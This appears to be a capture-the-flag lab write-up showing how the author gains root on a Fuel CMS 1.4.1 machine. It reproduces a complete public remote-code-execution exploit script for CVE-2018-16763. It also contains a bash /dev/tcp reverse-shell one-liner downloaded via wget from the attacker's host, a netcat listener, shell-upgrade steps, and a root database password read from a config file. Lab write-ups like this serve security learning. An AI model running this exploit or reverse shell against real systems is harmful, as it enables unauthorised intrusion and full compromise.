After i started machine i scanned target_ip, with nmap, to see what i can get:

```
$ sudo nmap -A -Pn -v 10.10.165.48

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

After i get output of that scan i went to check them

in `robots.txt` i found nothing important but in main page i found admin password for `/fuel/`

admin, admin

After login i tried to add some php code to reverse shell, but fuel Cms did not support php, 
so it's made with affort to avoid such injections(Or maybe I'm not that good yet)
 

After that i could not find any solution to deal with it, so i go to look for expolits

[Exploit DB](https://www.exploit-db.com/)

i searched for fuel cms, and Boom i found it

i downloaded this version for python3 `2021-11-03	Fuel CMS 1.4.1 - Remote Code Execution (3)`

```
$ cat 50477.py                               
# Edxploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
        parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.165.48//')

        parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

        parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

        args = parser.parse_args()

        if len(sys.argv) <=2:
                parser.print_usage()
                sys.exit()

        return args


args = get_arguments()
url = args.url 

if "http" not in url:
        sys.stderr.write("Enter vaild url")
        sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
        cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)

        main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

        r = requests.get(main_url)

        #<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

        output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
        print(output[0])
        if cmd == "exit":
                break
```
this is the python script which allows to use remote code execution

```
└─$ python3 50477.py -u http://10.10.165.48/
[+]Connecting...
Enter Command $
```
YUUP!! we connected.


after i got connected i use some commands to check my user permissions

```

Enter Command $ls /root
system

Enter Command $ls /root/system
system

Enter Command $which bash
system/bin/bash
```
as expected i dont have admin privilages. but i have user basic user privalages. It's enough to create and download a reverse shell script

i started my apache2 server `sudo systemctl start apache2` 

and created a rev.sh in /var/www/html/ directory

`bash -i >& /dev/tcp/<Your_tunel_IP>/4546 0>&1`--->rev.sh

And then i downloaded i script into fuel `cms server` basic priveleges is enough to do it
```
Enter Command $wget http://10.23.140.77/rev.sh

system

Enter Command $system

Enter Command $chmod +x rev.sh
system
```
it's installed successfuly and now before i decided to run `./run` i opened another terminal to listen to port 

`$nc -lvnp 4546`

and run the script
```
Enter Command $./rev.sh

```
Boom another terminal that i opened for listening port established connection now we can go and capture the flags

```
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ks
ks
ks: command not found
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd www-data
cd www-data
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b 
www-data@ubuntu:/home/www-data$ 
```
but as you can notice we still using web-shell so i dont have root privaleges

here is how we can open it `python -c “import pty;pty.spawn(‘/bin/bash’)”` 


Now i need to get flag from root folder, but before that i need root privileg to get access to it

```
www-data@ubuntu:/home$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/home$ ^Z
zsh: suspended  nc -lvnp 4546
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4546
                               ls
www-data

www-data@ubuntu:/home$ su root
Password: 
```
Yep! we did it, now to get password you look at `www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php`
```
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```
it was mentioned in main page.
 

```
root@ubuntu:/home# ls /root
root.txt
root@ubuntu:/home# cat root.txt
cat: root.txt: No such file or directory
root@ubuntu:/home# cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:/home# 
```

